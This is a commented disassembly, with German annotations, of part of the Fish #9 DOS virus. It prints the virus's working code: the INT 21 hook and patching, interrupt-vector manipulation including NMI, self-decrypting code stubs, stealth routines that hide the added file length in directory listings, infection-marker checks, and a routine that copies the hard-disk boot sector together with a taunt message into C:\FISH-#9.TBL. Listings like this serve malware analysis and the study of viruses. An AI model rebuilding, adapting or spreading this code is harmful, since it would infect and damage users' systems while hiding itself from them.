    MOV WORD PTR CS:L2598,OFFSET L037B  ;2B2B 2E C7 06 98 25 7B 03
    MOV BX,OFFSET L0335         ;2B32 BB 35 03
    MOV CX,0F               ;2B35 B9 0F 00
                        ;L2B38    L2B40 CJ
L2B38:  CMP CS:[BX],AH          ;2B38 2E 38 27
    JZ  L2B72               ;2B3B 74 35
    ADD BX,3                ;2B3D 83 C3 03
    LOOP    L2B38               ;2B40 E2 F6
    JMP L2B7B               ;2B42 E9 36 00

    DB  0F              ;2B45 0F
    DW  L0699               ;2B46 99 06
    DB  11              ;2B48 11
    DW  L04F4               ;2B49 F4 04
    DB  12              ;2B4B 12
    DW  L04F4               ;2B4C F4 04
    DB  14              ;2B4E 14
    DW  L06E0               ;2B4F E0 06
    DB  21              ;2B51 21
    DW  L06CA               ;2B52 CA 06
    DB  23              ;2B54 23
    DW  L08CF               ;2B55 CF 08
    DB  27              ;2B57 27
    DW  L06C8               ;2B58 C8 06
    DB  3DH             ;2B5A 3D
    DW  L0996               ;2B5B 96 09
    DB  3E              ;2B5D 3E
    DW  L09E4               ;2B5E E4 09
    DB  3F              ;2B60 3F
    DW  L1E5E               ;2B61 5E 1E
    DB  42              ;2B63 42
    DW  L1DA2               ;2B64 A2 1D
    DB  4BH             ;2B66 4B
    DW  L0A4D               ;2B67 4D 0A
    DB  4E              ;2B69 4E
    DW  L1F70               ;2B6A 70 1F
    DB  4F              ;2B6C 4F
    DW  L1F70               ;2B6D 70 1F
    DB  57              ;2B6F 57
    DW  L1D0F               ;2B70 0F 1D
                        ;L2B72    L2B3B CJ
L2B72:  INC BX              ;2B72 43
    PUSH    CS:[BX]             ;2B73 2E FF 37
    POP CS:L2598            ;2B76 2E 8F 06 98 25
                        ;L2B7B    L2B42 CJ
L2B7B:  CALL    L2BBA           ;Register restaurieren (Stack)  
                        ;2B7B E8 3C 00
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;2B7E E8 08 1E
    DB  5BH             ;2B81 5B
    JMP WORD PTR CS:L2598       ;2B82 2E FF 26 98 25

                        ;L2B87    L3936 CJ
L2B87:  PUSH    SI              ;2B87 56
    JMP L491B               ;2B88 E9 90 1D

                        ;L2B8B    L2F08 CJ  L3182 CJ  L31F1 CJ  L3227 CJ  L3500 CJ  L45CD CJ  L466B CJ
L2B8B:  JMP L48F3               ;2B8B E9 65 1D

    INC BX              ;2B8E 43
    INC CX              ;2B8F 41
    XOR [BX],CX             ;2B90 31 0F
    CMP [BX],CX             ;2B92 39 0F
    DB  77              ;2B94 77
                        ;L2B95    L2D19 CJ  L2EA6 CJ  L32D5 CJ  L4544 CJ  L454D CJ
L2B95:  CALL    L3243           ;decode_code    ;2B95 E8 AB 06
    DW  L561B               ;2B98 1B 56
    CALL    L2C8B           ;Register sichern ( CS: Stack ) 
                        ;2B9A E8 EE 00
    CALL    L2C0F           ;Int 21 patchen auf jmp cs:2256 [244c]:[244e] / repatchen   
                        ;2B9D E8 6F 00
    CALL    L2BD7           ;Register restaurieren ( CS : Stack )   
                        ;2BA0 E8 34 00
    MOV BP,SP               ;2BA3 89 E5
    PUSH    CS:L24B3            ;2BA5 2E FF 36 B3 24
    POP [BP+6]              ;2BAA 8F 46 06
    POP BP              ;2BAD 5D
    CALL    L3186           ;restauriere Int 02 (NMI) auf [2594]:[2592] (Original)  
                        ;2BAE E8 D5 05
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;2BB1 E8 D5 1D
    DB  1C              ;2BB4 1C
    IRET                    ;2BB5 CF

                        ;L2BB6    L3916 CJ
L2BB6:  XLAT                    ;2BB6 D7
    CMP AL,0FF              ;2BB7 3C FF
    DB  75              ;2BB9 75
                        ;L2BBA    L2B7B CC  L2BED CC  L2D09 CC  L2E9F CC  L2EA3 CC  L2EAE CC  L2F5A CC
                        ;     L3179 CC  L319E CC  L3291 CC  L3412 CC  L3628 CC  L362F CC  L390E CC
                        ;     L396A CC  L39BB CC  L3A7C CC  L452E CC  L478B CC  L4902 CC  L4A45 CC
                        ;     L4B2E CC  L4B5B CC
;   Register restaurieren (Stack)
L2BBA:  CALL    L3243           ;decode_code    ;2BBA E8 86 06
    DW  L3C12               ;2BBD 12 3C
    POP CS:L24EA            ;2BBF 2E 8F 06 EA 24
    POP ES              ;2BC4 07
    POP DS              ;2BC5 1F
    POP DI              ;2BC6 5F
    POP SI              ;2BC7 5E
    POP DX              ;2BC8 5A
    POP CX              ;2BC9 59
    POP BX              ;2BCA 5B
    POP AX              ;2BCB 58
    POPF                    ;2BCC 9D
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;2BCD E8 B9 1D
    DB  13              ;2BD0 13
    JMP WORD PTR CS:L24EA       ;2BD1 2E FF 26 EA 24

    DB  0F6             ;2BD6 F6
                        ;L2BD7    L2B19 CC  L2BA0 CC  L3471 CC  L3A17 CC  L3A23 CC  L4512 CC  L48B5 CC
                        ;     L48E9 CC  L4A4B CC
;   Register restaurieren ( CS : Stack )
L2BD7:  CALL    L3243           ;decode_code    ;2BD7 E8 69 06
    DW  L4628               ;2BDA 28 46
    MOV CS:L2557,SP         ;2BDC 2E 89 26 57 25
    MOV CS:L2559,SS         ;2BE1 2E 8C 16 59 25
    PUSH    CS              ;2BE6 0E
    POP SS              ;2BE7 17
    MOV SP,CS:L255B         ;2BE8 2E 8B 26 5B 25
    CALL    CS:L2BBA        ;Register restaurieren (Stack)  
                        ;2BED 2E E8 C9 FF
    MOV SS,CS:L2559         ;2BF1 2E 8E 16 59 25
    MOV CS:L255B,SP         ;2BF6 2E 89 26 5B 25
    MOV SP,CS:L2557         ;2BFB 2E 8B 26 57 25
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;2C00 E8 86 1D
    DB  29              ;2C03 29
    RET_NEAR                ;2C04 C3

    MOV SI,OFFSET L34AF         ;2C05 BE AF 34
    PUSH    CS              ;2C08 0E
    POP BX              ;2C09 5B
    PUSH    BX              ;2C0A 53
    POP DX              ;2C0B 5A
    PUSH    DX              ;2C0C 52
    DW  L068F               ;2C0D 8F 06
                        ;L2C0F    L293D CC  L29C6 CC  L29CE CC  L2B16 CC  L2B9D CC  L346E CC  L4A48 CC
                        ;     L4B2B CC
;   Int 21 patchen auf jmp cs:2256 [244c]:[244e] / repatchen
L2C0F:  CALL    L3243           ;decode_code    ;2C0F E8 31 06
    DW  LD61C               ;2C12 1C D6
    MOV SI,OFFSET L244B ;'$K'       ;2C14 BE 4B 24
    LES BH,DWORD PTR CS:L2435       ;2C17 2E C4 3E 35 24
    PUSH    CS              ;2C1C 0E
    POP DS              ;2C1D 1F
    CLD                 ;2C1E FC
    MOV CX,5                ;2C1F B9 05 00
                        ;L2C22    L2C2A CJ
L2C22:  LODSB                   ;2C22 AC
    XCHG    AL,ES:[DI]          ;2C23 26 86 05
    MOV [SI-1],AL           ;2C26 88 44 FF
    INC DI              ;2C29 47
    LOOP    L2C22               ;2C2A E2 F6
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;2C2C E8 5A 1D
    DB  1DH             ;2C2F 1D
    RET_NEAR                ;2C30 C3

                        ;L2C31    L2C37 CJ  L3931 CJ
L2C31:  XOR AX,CX               ;2C31 33 C1
    INC BX              ;2C33 43
    OR  ES:[BX],AX          ;2C34 26 09 07
    LOOP    L2C31               ;2C37 E2 F8
    MOV BX,CX               ;2C39 8B D9
    DB  0E8             ;2C3B E8
                        ;L2C3C    L2B1C CC  L2B28 CC  L2CA1 CC  L2D21 CC  L2D6F CC  L2EB6 CC  L2F5D CC
                        ;     L314B CC  L318B CC  L3355 CC  L35FF CC  L38D2 CC  L3944 CC  L399F CC
                        ;     L3A46 CC  L4793 CC  L4A2A CC  L4B28 CC  L4B41 CC
;   Register sichern (Stack)
L2C3C:  CALL    L3243           ;decode_code    ;2C3C E8 04 06
    DW  LB512               ;2C3F 12 B5
    POP CS:L24EA            ;2C41 2E 8F 06 EA 24
    PUSHF                   ;2C46 9C
    PUSH    AX              ;2C47 50
    PUSH    BX              ;2C48 53
    PUSH    CX              ;2C49 51
    PUSH    DX              ;2C4A 52
    PUSH    SI              ;2C4B 56
    PUSH    DI              ;2C4C 57
    PUSH    DS              ;2C4D 1E
    PUSH    ES              ;2C4E 06
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;2C4F E8 37 1D
    DB  13              ;2C52 13
    JMP WORD PTR CS:L24EA       ;2C53 2E FF 26 EA 24

                        ;L2C58    L4859 CC  L48FF CC
L2C58:  CALL    L3243           ;decode_code    ;2C58 E8 E8 05
    DW  LAB0E               ;2C5B 0E AB
    MOV AL,1                ;2C5D B0 01
    PUSH    CS              ;2C5F 0E
    POP DS              ;2C60 1F
    MOV DX,OFFSET L21C6         ;2C61 BA C6 21
    CALL    L2C6C           ;set Int (AL) to ds:dx  ;2C64 E8 05 00
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;2C67 E8 1F 1D
    DB  0F  ??          ;2C6A 0F
    RET_NEAR                ;2C6B C3

                        ;L2C6C    L28FE CC  L29B0 CC  L2C64 CC  L3176 CC  L319B CC  L3496 CC  L489C CC
                        ;     L48B2 CC  L48DC CC  L48E6 CC  L4A42 CC
;   set Int (AL) to ds:dx
L2C6C:  CALL    L3243           ;decode_code    ;2C6C E8 D4 05
    DW  L5519               ;2C6F 19 55
    PUSH    ES              ;2C71 06
    PUSH    BX              ;2C72 53
    XOR BX,BX               ;2C73 33 DB
    MOV ES,BX               ;2C75 8E C3
    MOV BL,AL               ;2C77 8A D8
    SHL BX,1                ;2C79 D1 E3
    SHL BX,1                ;2C7B D1 E3
    MOV ES:[BX],DX          ;2C7D 26 89 17
    MOV ES:[BX+2],DS            ;2C80 26 8C 5F 02
    POP BX              ;2C84 5B
    POP ES              ;2C85 07
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;2C86 E8 00 1D
    SBB AL,BL               ;2C89 1A C3
                        ;L2C8A    L3CBB DI
L2C8A   EQU $-1
                        ;L2C8B    L2B13 CC  L2B9A CC  L346B CC  L397F CC  L39C8 CC  L44D3 CC  L4839 CC
                        ;     L48D2 CC  L4A27 CC
;   Register sichern ( CS: Stack )
L2C8B:  CALL    L3243           ;decode_code    ;2C8B E8 B5 05
    DW  L4828               ;2C8E 28 48
    MOV CS:L2557,SP         ;2C90 2E 89 26 57 25
    MOV CS:L2559,SS         ;2C95 2E 8C 16 59 25
    PUSH    CS              ;2C9A 0E
    POP SS              ;2C9B 17
    MOV SP,CS:L255B         ;2C9C 2E 8B 26 5B 25
    CALL    CS:L2C3C        ;Register sichern (Stack)   
                        ;2CA1 2E E8 97 FF
    MOV SS,CS:L2559         ;2CA5 2E 8E 16 59 25
    MOV CS:L255B,SP         ;2CAA 2E 89 26 5B 25
    MOV SP,CS:L2557         ;2CAF 2E 8B 26 57 25
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;2CB4 E8 D2 1C
    DB  29              ;2CB7 29
    RET_NEAR                ;2CB8 C3

                        ;L2CB9    L28E9 CC  L2950 CC  L2994 CC  L3156 CC  L4840 CC  L48A2 CC  L4A39 CC
;   get Int (AL) into es:bx
L2CB9:  CALL    L3243           ;decode_code    ;2CB9 E8 87 05
    DW  LB819               ;2CBC 19 B8
    PUSH    DS              ;2CBE 1E
    PUSH    SI              ;2CBF 56
    XOR SI,SI               ;2CC0 33 F6
    MOV DS,SI               ;2CC2 8E DE
    XOR AH,AH               ;2CC4 32 E4
    MOV SI,AX               ;2CC6 8B F0
    SHL SI,1                ;2CC8 D1 E6
    SHL SI,1                ;2CCA D1 E6
    MOV BX,[SI]             ;2CCC 8B 1C
    MOV ES,[SI+2]           ;2CCE 8E 44 02
    POP SI              ;2CD1 5E
    POP DS              ;2CD2 1F
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;2CD3 E8 B3 1C
    DB  1A              ;2CD6 1A
    RET_NEAR                ;2CD7 C3

                        ;L2CD8    L2A7A CC
;   +7 zu call 2ad2, [2cff]  cc (int 3)-> c3 (ret)
L2CD8:  POP AX              ;2CD8 58
    ADD WORD PTR [BP+8],7       ;2CD9 83 46 08 07
    XCHG    BX,[BP+8]           ;2CDD 87 5E 08
    MOV DX,BX               ;2CE0 89 DA
    XCHG    BX,[BP+2]           ;2CE2 87 5E 02
    SUB SI,OFFSET L0478         ;2CE5 81 EE 78 04
    MOV BX,SI               ;2CE9 89 F3
    ADD BX,OFFSET L04EF         ;2CEB 81 C3 EF 04
    POP BP              ;2CEF 5D
    PUSH    CS:[SI+L0971]           ;2CF0 2E FF B4 71 09
    POP AX              ;2CF5 58
    XOR AX,OFFSET L020C         ;2CF6 35 0C 02
    MOV CS:[BX],AL          ;2CF9 2E 88 07
    ADD AX,OFFSET L020C         ;2CFC 05 0C 02
    RET_NEAR                ;2CFF C3

                        ;L2D00    L2FE7 CJ
L2D00:  JMP L2D60               ;2D00 E9 5D 00

    DB  0EBH                ;2D03 EB
    CALL    L3243           ;decode_code    ;2D04 E8 3C 05
    DW  L270E               ;2D07 0E 27
    CALL    L2BBA           ;Register restaurieren (Stack)  
                        ;2D09 E8 AE FE
    CALL    WORD PTR CS:L2566       ;2D0C 2E FF 16 66 25
    OR  AL,AL               ;2D11 0A C0
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;2D13 E8 73 1C
    DB  0F  ??          ;2D16 0F
    JZ  L2D1C               ;2D17 74 03
    JMP L2B95               ;2D19 E9 79 FE

                        ;L2D1C    L2D17 CJ
L2D1C:  CALL    L3243           ;decode_code    ;2D1C E8 24 05
    DW  L1820               ;2D1F 20 18
    CALL    L2C3C           ;Register sichern (Stack)   
                        ;2D21 E8 18 FF
    CALL    L322B           ;get DTA-adress nach ds:bx  
                        ;2D24 E8 04 05
    MOV AL,0                ;2D27 B0 00
    CMP BYTE PTR [BX],0FF       ;2D29 80 3F FF
    JNZ L2D34               ;2D2C 75 06
    MOV AL,[BX+6]           ;2D2E 8A 47 06
    ADD BX,7                ;2D31 83 C3 07
                        ;L2D34    L2D2C CJ
L2D34:  AND CS:L24F0,AL         ;2D34 2E 20 06 F0 24
    TEST    BYTE PTR [BX+18],80     ;2D39 F6 47 18 80
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;2D3D E8 49 1C
    DB  21              ;2D40 21
    JNZ L2D46               ;2D41 75 03
                        ;L2D43    L38D2 DI
L2D43:  JMP L2EA3               ;2D43 E9 5D 01

                        ;L2D46    L2D41 CJ
L2D46:  SUB BYTE PTR [BX+18],80     ;2D46 80 6F 18 80
    CMP WORD PTR [BX+1DH],OFFSET L2400  ;2D4A 81 7F 1D 00 24
    JNB L2D54               ;2D4F 73 03
    JMP L2EA3               ;2D51 E9 4F 01

                        ;L2D54    L2D4F CJ
L2D54:  SUB WORD PTR [BX+1DH],OFFSET L2400  ;2D54 81 6F 1D 00 24
    SBB WORD PTR [BX+1F],0      ;2D59 83 5F 1F 00
    JMP L2EA3               ;2D5D E9 43 01

                        ;L2D60    L2D00 CJ
L2D60:  LOOP    L2D66               ;2D60 E2 04
    JMP L3251               ;2D62 E9 EC 04

    DB  0EBH                ;2D65 EB
                        ;L2D66    L2D60 CJ
L2D66:  INC BX              ;2D66 43
    JMP L2FA2               ;2D67 E9 38 02

                        ;L2D6A    L383C CC
;   lies bootsector von harddisk und schreibe samt msg auf c:\fish-#9.tbl
L2D6A:  CALL    L3243           ;decode_code    ;2D6A E8 D6 04
    DW  LF00B               ;2D6D 0B F0
    CALL    L2C3C           ;Register sichern (Stack)   
                        ;2D6F E8 CA FE
    IN  AL,40               ;2D72 E4 40
    CMP AL,40   ;'@'            ;2D74 3C 40
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;2D76 E8 10 1C
    DB  0C              ;2D79 0C
    JB  L2D7F               ;2D7A 72 03
    JMP L2E9F               ;2D7C E9 20 01

                        ;L2D7F    L2D7A CJ
L2D7F:  CALL    L3243           ;decode_code    ;2D7F E8 C1 04
    DW  LA820               ;2D82 20 A8
    MOV AH,2                ;2D84 B4 02
    MOV AL,1                ;2D86 B0 01
    PUSH    CS              ;2D88 0E
    POP BX              ;2D89 5B
    SUB BH,10               ;2D8A 80 EF 10
    MOV ES,BX               ;2D8D 8E C3
    MOV BX,0                ;2D8F BB 00 00
    MOV CH,0                ;2D92 B5 00
    MOV CL,1                ;2D94 B1 01
    MOV DH,0                ;2D96 B6 00
    MOV DL,80               ;2D98 B2 80
    PUSHF                   ;2D9A 9C
    CALL    DWORD PTR   CS:L242D    ;2D9B 2E FF 1E 2D 24
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;2DA0 E8 E6 1B
    DB  21              ;2DA3 21
    JNB L2DA9               ;2DA4 73 03
    JMP L2E9F               ;2DA6 E9 F6 00

                        ;L2DA9    L2DA4 CJ
L2DA9:  CALL    L3243           ;decode_code    ;2DA9 E8 97 04
    DW  LACF1               ;2DAC F1 AC
    PUSH    CS              ;2DAE 0E
    POP DS              ;2DAF 1F
    MOV AH,5BH  ;'['            ;2DB0 B4 5B
    MOV CX,2                ;2DB2 B9 02 00
    MOV DX,OFFSET L05CB         ;2DB5 BA CB 05
    CALL    WORD PTR CS:L2566       ;2DB8 2E FF 16 66 25
    JNB L2DC2               ;2DBD 73 03
    JMP L2E9B               ;2DBF E9 D9 00

                        ;L2DC2    L2DBD CJ
L2DC2:  PUSH    ES              ;2DC2 06
    POP DS              ;2DC3 1F
    MOV BX,AX               ;2DC4 8B D8
    MOV AH,40   ;'@'            ;2DC6 B4 40
    MOV CX,OFFSET L0200         ;2DC8 B9 00 02
    MOV DX,0                ;2DCB BA 00 00
    CALL    WORD PTR CS:L2566       ;2DCE 2E FF 16 66 25
    JB  L2DD8               ;2DD3 72 03
    JMP L2E85               ;2DD5 E9 AD 00

                        ;L2DD8    L2DD3 CJ
L2DD8:  JMP L2E9B               ;2DD8 E9 C0 00

    DB  'C:\FISH-#9.TBL',0
    DB  'FISH VIRUS #9  A Whale is no '
                        ;L2E07    L28A5 DI
L2E07   DB  'Fish! Mind her Mutant Fish and the hidden Fish Eggs f'
    DB  'or they are damagi'
                        ;L2E4E    L45EC DI
L2E4E   DB  'ng.'
                        ;L2E51    L288B DI
L2E51   DB  ' The sixth Fish mutates only if Whale is in her Cave'
                        ;L2E85    L2DD5 CJ
L2E85:  PUSH    CS              ;2E85 0E
    POP DS              ;2E86 1F
    MOV AH,40   ;'@'            ;2E87 B4 40
    MOV CX,9BH              ;2E89 B9 9B 00
    MOV DX,OFFSET L05DA         ;2E8C BA DA 05
    CALL    WORD PTR L2566          ;2E8F FF 16 66 25
    JB  L2E9B               ;2E93 72 06
    MOV AH,3E   ;'>'            ;2E95 B4 3E
    CALL    WORD PTR L2566          ;2E97 FF 16 66 25
                        ;L2E9B    L2DBF CJ  L2DD8 CJ  L2E93 CJ
L2E9B:  CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;2E9B E8 EB 1A
                        ;L2E9C    L2864 DI
L2E9C   EQU $-2
    DB  0F2             ;2E9E F2
                        ;L2E9F    L2D7C CJ  L2DA6 CJ
L2E9F:  CALL    L2BBA           ;Register restaurieren (Stack)  
                        ;2E9F E8 18 FD
    RET_NEAR                ;2EA2 C3

                        ;L2EA3    L2D43 CJ  L2D51 CJ  L2D5D CJ  L2EBF CJ  L2EC7 CJ  L2ED6 CJ  L2F9C CJ
                        ;     L3044 CJ  L3143 CJ  L31ED CJ  L458A CJ  L4701 CJ  L47A2 CJ  L47AE CJ
                        ;     L47CD CJ
L2EA3:  CALL    L2BBA           ;Register restaurieren (Stack)  
                        ;2EA3 E8 14 FD
    JMP L2B95               ;2EA6 E9 EC FC

    CALL    L3243           ;decode_code    ;2EA9 E8 97 03
    DW  L6011               ;2EAC 11 60
    CALL    L2BBA           ;Register restaurieren (Stack)  
                        ;2EAE E8 09 FD
    CALL    WORD PTR CS:L2566       ;2EB1 2E FF 16 66 25
    CALL    L2C3C           ;Register sichern (Stack)   
                        ;2EB6 E8 83 FD
    OR  AL,AL               ;2EB9 0A C0
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;2EBB E8 CB 1A
    DB  12              ;2EBE 12
    JNZ L2EA3               ;2EBF 75 E2
    MOV BX,DX               ;2EC1 89 D3
    TEST    BYTE PTR [BX+17],80     ;2EC3 F6 47 17 80
    JZ  L2EA3               ;2EC7 74 DA
    SUB BYTE PTR [BX+17],80     ;2EC9 80 6F 17 80
    SUB WORD PTR [BX+10],OFFSET L2400   ;2ECD 81 6F 10 00 24
    SBB BYTE PTR [BX+12],0      ;2ED2 80 5F 12 00
    JMP SHORT   L2EA3           ;2ED6 EB CB

    JCXZ    L2F08               ;2ED8 E3 2E
    CALL    L3243           ;decode_code    ;2EDA E8 66 03
    DW  LF60C               ;2EDD 0C F6
    MOV BX,DX               ;2EDF 89 D3
    MOV SI,[BX+21]          ;2EE1 8B 77 21
    OR  SI,[BX+23]          ;2EE4 0B 77 23
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;2EE7 E8 9F 1A
    DB  0DH             ;2EEA 0D
    JNZ L2F08               ;2EEB 75 1B
    JMP SHORT   L2F03           ;2EED EB 14

    DB  0E8             ;2EEF E8
    CALL    L3243           ;decode_code    ;2EF0 E8 50 03
    DW  L940C               ;2EF3 0C 94
    MOV BX,DX               ;2EF5 89 D3
    MOV AX,[BX+0C]          ;2EF7 8B 47 0C
    OR  AL,[BX+20]          ;2EFA 0A 47 20
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;2EFD E8 89 1A
    DB  0DH             ;2F00 0D
    JNZ L2F08               ;2F01 75 05
                        ;L2F03    L2EED CJ
L2F03:  CALL    L397A               ;2F03 E8 74 0A
    JNB L2F55               ;2F06 73 4D
                        ;L2F08    L2ED8 CJ  L2EEB CJ  L2F01 CJ
L2F08:  JMP L2B8B               ;2F08 E9 80 FC

                        ;L2F0B    L2F49 CJ
L2F0B:  JMP L3251               ;2F0B E9 43 03

    DW  L5689,L8902,L044E       ;2F0E 89 56 02 89 4E 04
    DB  0EBH                ;2F14 EB
                        ;L2F15    L2987 CJ
L2F15:  IN  AL,21               ;2F15 E4 21
    OR  AL,2                ;2F17 0C 02
    OUT 21,AL               ;2F19 E6 21
    XOR BX,BX               ;2F1B 33 DB
    PUSH    BX              ;2F1D 53
    MOV BP,20   ;' '            ;2F1E BD 20 00
    POP DS              ;2F21 1F
    MOV CX,BP               ;2F22 89 E9
    CALL    L2F27           ;cx=bp=0020h Schleifenzaehler fuer xlat aufruf  
                        ;2F24 E8 00 00
                        ;L2F27    L2F24 CC
;   cx=bp=0020h Schleifenzaehler fuer xlat aufruf
L2F27:  POP BX              ;2F27 5B
    PUSH    BX              ;2F28 53
    POP DX              ;2F29 5A
    PUSH    CS              ;2F2A 0E
    POP AX              ;2F2B 58
    ADD AX,10               ;2F2C 05 10 00
    ADD BX,AX               ;2F2F 01 C3
    XOR DX,BX               ;2F31 33 D3
                        ;L2F33    L2FA0 CJ
L2F33:  SUB SI,OFFSET LFB88         ;2F33 81 EE 88 FB
    CALL    L2AD2               ;2F37 E8 98 FB
    DW  LC6E9,LEB05,LA2E9       ;2F3A E9 C6 05 EB E9 A2
    DB  6               ;2F40 06
    XCHG    DX,BX               ;2F41 87 D3
    MOV DS:4,BX             ;2F43 89 1E 04 00
    OR  CX,CX               ;2F47 0B C9
                        ;L2F48    L45F4 DI
L2F48   EQU $-1
    JZ  L2F0B               ;2F49 74 C0
    DEC CX              ;2F4B 49
    JMP L2FA2               ;2F4C E9 53 00

    DW  L1CB9,L5300,LE857       ;2F4F B9 1C 00 53 57 E8
                        ;L2F55    L2F06 CJ
L2F55:  CALL    L3243           ;decode_code    ;2F55 E8 EB 02
    DW  L191E               ;2F58 1E 19
    CALL    L2BBA           ;Register restaurieren (Stack)  
                        ;2F5A E8 5D FC
    CALL    L2C3C           ;Register sichern (Stack)   
                        ;2F5D E8 DC FC
    CALL    WORD PTR CS:L2566       ;2F60 2E FF 16 66 25
    MOV [BP-8],CX           ;2F65 89 4E F8
    MOV [BP-4],AX           ;2F68 89 46 FC
    PUSH    DS              ;2F6B 1E
    PUSH    DX              ;2F6C 52
    CALL    L322B           ;get DTA-adress nach ds:bx  
                        ;2F6D E8 BB 02
    CMP WORD PTR [BX+14],1      ;2F70 83 7F 14 01
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;2F74 E8 12 1A
    DB  1F              ;2F77 1F
    JZ  L2FF6               ;2F78 74 7C
    CALL    L3243           ;decode_code    ;2F7A E8 C6 02
    DW  L3618               ;2F7D 18 36
    MOV AX,[BX]             ;2F7F 8B 07
    ADD AX,[BX+2]           ;2F81 03 47 02
    PUSH    BX              ;2F84 53
    MOV BX,[BX+4]           ;2F85 8B 5F 04
    XOR BX,OFFSET L5348 ;'SH'       ;2F88 81 F3 48 53
    XOR BX,OFFSET L4649 ;'FI'       ;2F8C 81 F3 49 46
    ADD AX,BX               ;2F90 01 D8
    POP BX              ;2F92 5B
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;2F93 E8 F3 19
    DB  19              ;2F96 19
    JZ  L2FF6               ;2F97 74 5D
    ADD SP,4                ;2F99 83 C4 04
    JMP L2EA3               ;2F9C E9 04 FF

    DB  12              ;2F9F 12
                        ;L2FA0    L2FBC CJ
L2FA0:  JMP SHORT   L2F33           ;2FA0 EB 91

                        ;L2FA2    L2D67 CJ  L2F4C CJ
L2FA2:  MOV DS:4,DX             ;2FA2 89 16 04 00
    MOV BX,DS:0C            ;2FA6 8B 1E 0C 00
    IN  AL,1                ;2FAA E4 01
    OR  CX,CX               ;2FAC 0B C9
    JZ  L2FC0               ;2FAE 74 10
    CMP CL,BL               ;2FB0 38 D9
    JB  L2FC0               ;2FB2 72 0C
    XCHG    BX,DX               ;2FB4 87 DA
    MOV DS:4,DX             ;2FB6 89 16 04 00
    XOR DX,AX               ;2FBA 31 C2
    LOOP    L2FA0               ;2FBC E2 E2
    JZ  L2FCB           ;si=2810h , [3259] cc -> e8 
                        ;2FBE 74 0B
                        ;L2FC0    L2FAE CJ  L2FB2 CJ
L2FC0:  ADD SI,OFFSET L0478         ;2FC0 81 C6 78 04
    CALL    L2AD2               ;2FC4 E8 0B FB
    DW  LA8E9,LEA09         ;2FC7 E9 A8 09 EA
                        ;L2FCB    L2FBE CJ  L2FD6 CJ
;   si=2810h , [3259] cc -> e8
L2FCB:  JMP L3251               ;2FCB E9 83 02

    MOV BYTE PTR CS:[SI+L0A49],0E8  ;2FCE 2E C6 84 49 0A E8
    OR  CX,CX               ;2FD4 0B C9
    JZ  L2FCB           ;si=2810h , [3259] cc -> e8 
                        ;2FD6 74 F3
    MOV DS:0C,BX            ;2FD8 89 1E 0C 00
    XOR DX,BX               ;2FDC 33 D3
    MOV DS:4,DX             ;2FDE 89 16 04 00
    XOR AX,DX               ;2FE2 31 D0
    MOV DS:0C,AX            ;2FE4 A3 0C 00
    JMP L2D00               ;2FE7 E9 16 FD

                        ;L2FEA    L324E CJ
L2FEA:  ADD SI,OFFSET L3490         ;2FEA 81 C6 90 34
    MOV CX,1C               ;2FEE B9 1C 00
    REPZ    MOVSB               ;2FF1 F3 A4
    XOR CX,CX               ;2FF3 33 C9
    DB  0E8             ;2FF5 E8
                        ;L2FF6    L2F78 CJ  L2F97 CJ
L2FF6:  CALL    L3243           ;decode_code    ;2FF6 E8 4A 02
    DW  L9E49               ;2FF9 49 9E
    POP DX              ;2FFB 5A
    POP DS              ;2FFC 1F
    MOV SI,DX               ;2FFD 89 D6
    PUSH    CS              ;2FFF 0E
    POP ES              ;3000 07
    MOV CX,25   ;'%'            ;3001 B9 25 00
    MOV DI,OFFSET L24B5         ;3004 BF B5 24
    REPZ    MOVSB               ;3007 F3 A4
    MOV DI,OFFSET L24B5         ;3009 BF B5 24
    PUSH    CS              ;300C 0E
    POP DS              ;300D 1F
    MOV DX,[DI+12]          ;300E 8B 55 12
    MOV AX,[DI+10]          ;3011 8B 45 10
    ADD AX,OFFSET L240F         ;3014 05 0F 24
    ADC DX,0                ;3017 83 D2 00
    AND AX,OFFSET LFFF0         ;301A 25 F0 FF
    MOV [DI+12],DX          ;301D 89 55 12
    MOV [DI+10],AX          ;3020 89 45 10
    SUB AX,OFFSET L23FC         ;3023 2D FC 23
    SBB DX,0                ;3026 83 DA 00
    MOV [DI+23],DX          ;3029 89 55 23
    MOV [DI+21],AX          ;302C 89 45 21
                        ;L302F    L3074 DI
L302F:  MOV CX,1C               ;302F B9 1C 00
    MOV WORD PTR [DI+0E],1      ;3032 C7 45 0E 01 00
    MOV AH,27   ;"'"            ;3037 B4 27
    MOV DX,DI               ;3039 89 FA
    CALL    WORD PTR CS:L2566       ;303B 2E FF 16 66 25
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;3040 E8 46 19
    DB  4A              ;3043 4A
    JMP L2EA3               ;3044 E9 5C FE

                        ;L3047    L3053 CC  L305C CC  L3065 CC  L306E CC  L3077 CC  L3080 CC  L3089 CC
